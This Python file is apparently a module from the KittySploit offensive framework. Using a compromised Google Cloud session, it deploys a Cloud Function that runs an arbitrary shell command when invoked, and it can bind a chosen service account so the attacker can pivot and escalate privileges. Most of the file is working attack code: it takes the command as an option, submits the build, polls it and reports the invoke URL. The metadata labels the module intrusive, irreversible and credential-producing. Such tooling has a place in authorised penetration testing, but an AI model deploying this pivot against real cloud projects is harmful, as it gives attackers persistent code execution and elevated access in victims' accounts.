#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import re
import time

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Cloud Function Deploy Command Pivot",
        "description": "Deploy a Gen2 Cloud Function via Cloud Build that executes an arbitrary command on HTTP invoke",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "cloud-functions", "pivot", "privilege-escalation"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['configuration_change', 'active_exploitation', 'api_request'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    location = OptString("", "Cloud Functions region, for example europe-west1", True)
    command = OptString("", "Shell command executed when the deployed function is invoked", True)
    function_name = OptString("", "Function name; auto-generated when empty", False)
    service_account_email = OptString("", "Runtime service account for the deployed function", False)
    runtime = OptString("python312", "Cloud Functions runtime", False)
    entry_point = OptString("main", "Function entry point", False)
    wait_for_build = OptBool(True, "Poll the deployment build until completion", False)
    poll_seconds = OptInteger(15, "Polling interval while waiting for deployment build", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            location = str(self.location or "").strip()
            command = str(self.command or "").strip()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False
            if not command:
                print_error("command is required")
                return False

            function_name = str(self.function_name or "").strip() or self._default_function_name()
            sa = str(self.service_account_email or "").strip()
            print_info(f"Deploying Cloud Function pivot {function_name} in {location}...")
            deployed = self._gcp_deploy_cloud_function_command(
                project_id,
                location,
                function_name,
                command=command,
                runtime=str(self.runtime or "python312"),
                service_account=sa,
                entry_point=str(self.entry_point or "main"),
            )
            if not deployed.get("ok"):
                print_error(f"Function deployment build failed: {deployed.get('error', '')}")
                return False

            build = deployed.get("build") or {}
            build_id = str(build.get("id") or "").strip()
            print_success(f"Deployment build submitted: {build_id or 'unknown'}")
            if build.get("logUrl"):
                print_info(f"Build logs: {build.get('logUrl')}")

            final_build = build
            if self.wait_for_build and build_id:
                final_build = self._wait_for_build(project_id, build_id) or build

            function_url = deployed.get("function_url_hint")
            print_info(f"Expected invoke URL: {function_url}")
            print_warning("Function requires authenticated invoke; use an access token from the target identity")

            output = {
                "project_id": project_id,
                "location": location,
                "function_name": function_name,
                "service_account_email": sa,
                "command": command,
                "build_id": build_id,
                "build_status": final_build.get("status"),
                "function_url_hint": function_url,
                "build": final_build,
            }
            if self.export_json:
                exported = self._gcp_export_json(str(self.export_json or ""), output)
                if exported:
                    print_success(f"Results exported to {exported}")

            return self.module_result(success=True, data=output)
        except Exception as exc:
            print_error(f"Cloud Function command pivot failed: {exc}")
            return False

    def _default_function_name(self):
        principal = self._gcp_client_email() or "kitty"
        slug = re.sub(r"[^a-z0-9-]", "-", principal.split("@", 1)[0].lower())
        slug = re.sub(r"-+", "-", slug).strip("-")[:20] or "kitty"
        suffix = str(int(time.time()))[-6:]
        return f"ks-{slug}-{suffix}"

    def _wait_for_build(self, project_id, build_id):
        poll_s = max(5, int(self.poll_seconds or 15))
        deadline = time.time() + 1200
        latest = None
        while time.time() < deadline:
            result = self._gcp_get_cloud_build(project_id, build_id)
            if not result.get("ok"):
                print_warning(f"Build status poll failed: {result.get('error', '')}")
                break
            latest = result.get("build") or {}
            status = str(latest.get("status") or "")
            print_info(f"Deployment build status: {status}")
            if status in ("SUCCESS", "FAILURE", "CANCELLED", "TIMEOUT", "EXPIRED"):
                break
            time.sleep(poll_s)
        return latest
